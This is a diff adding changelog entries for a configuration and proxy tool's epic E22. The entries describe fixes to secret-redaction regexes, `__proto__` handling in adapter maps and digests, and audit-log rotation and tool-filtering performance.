+greedy `(.+)` while `EMBEDDED_REF_RE` used `([^}]+)`, so `${env:a}b}` parsed to path `a}b` vs `a`.
+
+**Fix.** New single-sourced `util/token-prefixes.ts` exports the known-prefix alternation + suffix;
+both the redactor's `KNOWN_TOKEN_RE` and the push guard's `RAW_SECRET` are now built from it, so they
+cover the same set (incl. `github_pat_` and `sk_(live|test)_`) and can't drift. In `secret-ref.ts` both
+matchers now share a `REF_PATH_CLASS = [^}]+`, so whole-string and embedded parsing agree that a path
+never contains a brace. `SECRET_REF_RE` (schema.ts) — the stricter validation grammar from S22.1 —
+already excludes `}`, so all three agree on the brace boundary (documented).
+
+Tests: `maskTokens` masks `github_pat_` and `sk_live_`/`sk_test_`; whole-string and embedded parsing
+agree on `${env:a}b}` (not-a-whole-ref; embedded finds `${env:a}` path `a`). `verify_all` green — lint,
+typecheck, full suite, and build.
+
+## S22.23 — Fix adapter/migration round-trip fidelity and residual __proto__ handling
+
+Started/done: 2026-07-11. LOW, several (verified). Three round-trip/hostile-key issues: (1) for
+url-shape clients (Cursor/Zed/Cline/Warp/LM Studio) an `sse` remote was written as a bare `url` with no
+transport marker, so `fromMcpServersShape` re-read it as `streamable-http` (transport lost on
+export→import). (2) The v1→v2 migration synthesized `servers: {}` when a v1 file omitted servers,
+masking the required-field error. (3) Adapter server maps (shared factory + vscode/gemini/opencode/
+codex/goose) and proxy `tool-digest.ts` `sortDeep` were built with plain-object assignment, so a
+server named `__proto__` or a `__proto__` schema key was mishandled — corrupting the map or evading the
+S18.1 pinning `schemaDigest`.
+
+**Fix.** (1) Documented the `sse`→`streamable-http` coercion for bare-url clients (they can't carry a
+type marker); type-carrying clients (Claude Code, VS Code) already round-trip `sse` via their `type`
+field. (2) The migration now only rebuilds `servers` when the source had one, preserving its absence so
+the schema error fires. (3) All those maps and `sortDeep` now use `Object.create(null)`, so a
+`__proto__` key becomes an own property (included in the digest; never pollutes the map).
+
+Tests: an `sse` server survives claude-code export→import; a `__proto__`-named server renders as an own
+key with an untouched prototype; the migration preserves `servers` absence (and loadConfig then rejects
+it); a `__proto__` schema key changes the tool digest (can't evade drift). `verify_all` green — lint,
+typecheck, full suite, and build.
+
+## S22.24 — Reduce proxy audit-sink syscalls and use a Set for the tool directive
+
+Started/done: 2026-07-11. LOW x2 (verified). `fileAuditSink` did `mkdirSync(recursive)` + `statSync` +
+`appendFileSync` (three syscalls) per event, and its size-check-then-`renameSync` rotation was a
+check-then-act with no locking, so concurrent proxies sharing a log path could both stat-under-limit
+then both rename/append, clobbering records. `isToolAllowed` did `directive.list.includes(name)` — an
+O(n) scan per tool → O(n*m) filtering on the `tools/call` hot path.
+
+**Fix.** The audit sink now creates the directory ONCE (cached flag) and keeps a running byte counter
+seeded from the file size a single time (no per-write `statSync`); on reaching `maxBytes` it rotates to
+a UNIQUE per-process filename (`${path}.<pid>.<seq>.<rand>`), so concurrent writers never clobber each
+other's rotated logs (and O_APPEND keeps interleaved appends atomic). New `compileDirective` precompiles
+the directive's list into a normalized `Set`; `filterTools`, `isToolAllowed`, and — via a compiled
+matcher held once in `connectProxy` — the `tools/call` guard all do O(1) membership.
+
+Tests: `compileDirective` gives Set-based membership consistent with mode + normalization; the audit
+sink rotates to a unique per-process file (holding the earlier event) and two writers sharing a path
+lose no records across rotation. `verify_all` green — lint, typecheck, full suite, and build.
+
+**All E22 stories (S22.1–S22.24) complete.**
